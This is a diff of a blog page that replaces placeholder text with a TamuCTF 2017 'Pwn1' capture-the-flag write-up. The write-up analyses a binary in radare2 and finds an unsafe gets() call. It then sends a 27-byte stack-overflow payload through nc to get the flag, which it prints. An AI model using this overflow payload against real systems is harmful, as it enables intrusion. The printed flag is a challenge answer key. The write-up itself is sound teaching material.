@@ -33,7 +33,7 @@
 
 
 
-    <title>Awesome Post</title>
+    <title>TamuCTF 2017 - Pwn 1</title>
 </head>
 
 <body style="background-image: url('/images/background.jpg');">
@@ -65,68 +65,109 @@
             <div class="hmdl-page mdl-grid">
                 <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
                     <div class="hmdl-page-banner mdl-card__media mdl-color-text--grey-50" style=" background-color:#838238;">
-                        <h3 >Awesome Post</h3>
+                        <h3 >TamuCTF 2017 - Pwn 1</h3>
                     </div>
                     <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
-                        <div class="minilogo" style="background-image: url('/images/doplerIcon.png');"></div>
                         <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>
 
                         <div>
 							<strong>
-                            		<strong>D00p3lg4ng3r</strong>
-                            		<strong>XXXXX</strong>
+                            		<strong>Tzaoh</strong>
 							</strong>
-                            <span>Aug 19, 2015</span>
+                            <span>May 27, 2017</span>
                         </div>
                         <div class="section-spacer"></div>
                     </div>
                     <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
-                        <p>Lorem Ipsum is simply dummy text of the printing and typesetting industry.
-Lorem Ipsum has been the industry&rsquo;s standard dummy text ever since the 1500s,
-when an unknown printer took a galley of type and scrambled it to make a type
-specimen book.  It has survived not only five centuries, but also the leap into
-electronic typesetting, remaining essentially unchanged. It was popularised in
-the 1960s with the release of Letraset sheets containing Lorem Ipsum passages,
-and more recently with desktop publishing software like Aldus PageMaker
-including versions of Lorem Ipsum.</p>
+                        
 
-<h3 id="lorem-ipsum">Lorem Ipsum</h3>
+<h1 id="tamuctf-2017-https-ctf-tamu-edu"><a href="https://ctf.tamu.edu/">TamuCTF 2017</a></h1>
 
-<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry.
-Lorem Ipsum has been the industry&rsquo;s standard dummy text ever since the 1500s,
-when an unknown printer took a galley of type and scrambled it to make a type
-specimen book. It has survived not only five centuries, but also the leap into
-electronic typesetting, remaining essentially unchanged. It was popularised in
-the 1960s with the release of Letraset sheets containing Lorem Ipsum passages,
-and more recently with desktop publishing software like Aldus PageMaker
-including versions of Lorem Ipsum.</p>
+<h3 id="pwn1-50-points">Pwn1 - 50 Points</h3>
 
-<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry.
-Lorem Ipsum has been the industry&rsquo;s standard dummy text ever since the 1500s,
-when an unknown printer took a galley of type and scrambled it to make a type
-specimen book. It has survived not only five centuries, but also the leap into
-electronic typesetting, remaining essentially unchanged. It was popularised in
-the 1960s with the release of Letraset sheets containing Lorem Ipsum passages,
-and more recently with desktop publishing software like Aldus PageMaker
-including versions of Lorem Ipsum.</p>
+<p><img src="/images/TamuCTF2017/pwn1/1-pwn1_description.png" alt="Pwn1 Challenge Description" /></p>
 
-<h3 id="lorem-ipsum-1">Lorem Ipsum</h3>
+<p>We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2.</p>
 
-<p>Lorem Ipsum is simply dummy text of the printing and typesetting industry.
-Lorem Ipsum has been the industry&rsquo;s standard dummy text ever since the 1500s,
-when an unknown printer took a galley of type and scrambled it to make a type
-specimen book. It has survived not only five centuries, but also the leap into
-electronic typesetting, remaining essentially unchanged. It was popularised in
-the 1960s with the release of Letraset sheets containing Lorem Ipsum passages,
-and more recently with desktop publishing software like Aldus PageMaker
-including versions of Lorem Ipsum.</p>
+<pre><code class="language-bash">$ wget https://ctf.tamu.edu/files/7e968d03d9caa11a2f4f2909bd3cabc9/pwn1
+$ r2 pwn1
+</code></pre>
+
+<p>Now that the binary is opened, we need to analyze its content.</p>
+
+<pre><code class="language-bash">[0xf7721ac0]&gt; aaa		# Analyze
+[0xf7721ac0]&gt; afl		# List functions found
+.
+.
+0x0804854b    4 103          sym.print_flag
+0x080485b2    4 120          main
+.
+.
+</code></pre>
+
+<p>Interesting, there is <strong>print_flag</strong> function at <code>0x0804854b</code>. Lets see what&rsquo;s inside.</p>
+
+<pre><code class="language-bash">[0xf771eac0]&gt; s sym.print_flag	# We move to beginning of print_flag function
+[0x0804854b]&gt; pdf				# print its code
+</code></pre>
+
+<p><img src="/images/TamuCTF2017/pwn1/2-pwn1_open_flag.png" alt="Pwn1 Open File Function" /></p>
+
+<p>Because of the offsets <code>0x08048569</code> and <code>0x0804856e</code> we can deduce that the function opens a file called <strong>flag.txt</strong> and prints its content. Fantastic :v:, so we just need to know who will call <strong>print_flag</strong>. This can be figured out through the <code>axt</code> command of r2 which stands for &ldquo;cross reference to&rdquo; the actual function.</p>
+
+<pre><code class="language-bash">[0x0804854b]&gt; axt
+call 0x8048606 call sym.print_flag in main
+</code></pre>
+
+<p>Cool, so this function will be called from offset <code>0x8048606</code> <strong>main</strong>. Lets see whats inside it.</p>
+
+<pre><code class="language-bash">[0x0804854b]&gt; s main
+[0x080485b2]&gt; pdf
+</code></pre>
+
+<p><img src="/images/TamuCTF2017/pwn1/3-pwn1_condition.png" alt="Pwn1 Condition" /></p>
+
+<p>We see that <strong>print_flag</strong> will be called if the condition <code>local_ch == 0xca11ab1e</code> is not satisfied. But wait a moment, if we give a closer look to the assembly instrucctions we realized that the only variable we are supposed to edit is <strong>local_27h</strong> through the <code>gets</code> function:</p>
+
+<p><img src="/images/TamuCTF2017/pwn1/4-pwn1_gets_call.png" alt="Pwn1 Gets Call" /></p>
+
+<p>So what we need to do? As maybe you know, <strong>gets</strong> is an unsecure function, because it does not check how many characters it must copy in memory when you introduce them. Then if we input more characters than it is supposed store, we will be able to overwrite neighbor local variables!</p>
+
+<p>How can we know the length of the string we must provide? By knowing where the variables are stored onto the stack</p>
+
+<p><img src="/images/TamuCTF2017/pwn1/5-pwn1_stack_view.png" alt="Pwn1 Stack diagram" /></p>
+
+<p>So finally, how many bytes do we need to start writting <strong>local_ch</strong>?
+Easy!</p>
+
+<p><code>($ebp - 0xC) - ($ebp - 0x27)  = 0x27 - 0xC = 0x1B = 27d</code> 27 Characters.</p>
+
+<pre><code class="language-bash">$ python -c 'print(&quot;A&quot;*27 + &quot;\x1E\xAB\x11\xCA&quot;)' | nc pwn.ctf.tamu.edu 4322
+Enter the secret word:
+How did you figure out my secret?!
+gigem{T00_435Y}
+</code></pre>
+
+<p>Answer: gigem{T00_435Y}</p>
+
+<h3 id="complete-video">Complete video</h3>
+
+<p><a href="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc?autoplay=1"><img src="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc.png" width="400"/></a></p>
+
+<h3 id="tools-used">Tools used:</h3>
+
+<ul>
+<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
+<li><a href="https://www.draw.io/">draw.io</a> - To draw some graphics.</li>
+<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
+</ul>
+
                     </div>
                     <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                         <strong>
-                            	<strong>D00p3lg4ng3r</strong>
-                            	<strong>XXXXX</strong>
+                            	<strong>Tzaoh</strong>
 						</strong>
-                        <p>Writer of stuff</p>
+                        <p></p>
                     </div>  
                 </div>                
                 <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
